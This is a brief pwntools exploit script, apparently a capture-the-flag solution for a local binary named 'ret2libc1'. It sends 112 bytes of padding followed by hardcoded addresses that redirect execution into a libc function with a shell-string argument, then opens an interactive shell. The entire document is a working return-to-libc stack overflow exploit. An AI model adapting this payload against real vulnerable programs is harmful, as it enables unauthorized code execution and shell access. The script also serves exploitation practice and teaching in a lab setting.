from pwn import *
p = process("./ret2libc1")
payload = b"a"*112 + p32(0x8048460) + b"XXXX" + p32(0x08048720)
p.sendline(payload)
p.interactive()

